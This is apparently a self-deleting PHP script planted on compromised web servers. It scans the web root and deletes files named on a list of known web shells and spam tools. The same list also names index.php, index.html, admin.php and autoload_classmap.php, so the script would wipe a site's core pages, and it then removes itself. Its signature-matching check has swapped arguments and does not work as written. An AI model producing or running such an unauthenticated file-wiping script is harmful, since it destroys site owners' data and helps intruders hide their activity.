<?php
function getDirs($dir, $file_name_for_delete, $features)
{
    $files = scandir($dir);
    $i = 0;
    foreach ($files as $file) {
        if ($file == '.' || $file == '..')
        {
            continue;
        }
        $real_dir = $dir . "/" . $file;
        $real_dir = str_replace("//", "/", $real_dir);

        if (is_file($real_dir)) {

            if (in_array($file, $file_name_for_delete))
            {

                @unlink($real_dir);
                $i++;
            } else {
                if (substr($file, strpos($file, ".php")) === ".php")
                {
                    $content = file_get_contents($real_dir);
                    foreach ($features as $item) {
                        if(strstr($item, $content) != false)
                        {
                            @unlink($real_dir);
                            $i++;
                        }
                    }
                }
            }
        }
    }
    return $i;
}
$rootPath = "";
if (isset($_SERVER['PHP_SELF']) && isset($_SERVER['SCRIPT_FILENAME']))
{
    $rootPath = str_replace(str_replace('//','/',$_SERVER['PHP_SELF']), '', str_replace('\\\\','/',$_SERVER['SCRIPT_FILENAME']) );
} else {
    echo "failed";
    die();
}
if (strstr($rootPath, "radio.php") == true)
{
    $rootPath = dirname(__FILE__);
}
$file_name_for_delete = array('new-index.php','stindex.php','sindex.php','tgwindex.php','jngindex.php','gimindex.php','brhindex.php','contact.php','baindex.php','adsindex.php','bkmindex.php','eyqindex.php','pheditor.php','upload.php','baindex.php','old-index.php','wikindex.php','1index.php','2index.php','xmrlpc.php','lock360.php','','admin.php','content.php','vwpindex.php','wasyuindex.php','ydkindex.php','xxyindex.php','klcindex.php','kljindex.php','mphindex.php','rqdindex.php','slzindex.php','tzfindex.php','baoindex.php','btcindex.php','poeindex.php','55index.php','afsindex.php','ccrindex.php','crrindex.php','eaoindex.php','fwyindex.php','fwyindex.php','gsaindex.php','hviindex.php','jcrindex.php','indeeex.php','indeex.php','index.php','index.html','smtphec.php','contents.php','smtpcrack2.php','smtpcrack.php','.wp-admin.php','lock360.php.suspected','admin.php.suspected','content.php.suspected','indexx.php','contents.php','load.php','installer.php','indoxploit.php','sh1raoka.php','shira0ka.php','3index.php','36zxacps.php','6y8tm6n5.php','autoload_classmap.php','cbotbphx.php','3index.php','current_index.html');
$features = array(
    '01o_4yfc8rt3gbkdevmsij9l-nqpz2h7u5wxa6',
    'l107ag5yrufewos-dtjix9phn4_82ckz6qvm3b',
    'JGNoID0gY3VybF9pbml0KCd',
);
$count = getDirs($rootPath, $file_name_for_delete, $features);
echo $count;
unlink(__FILE__);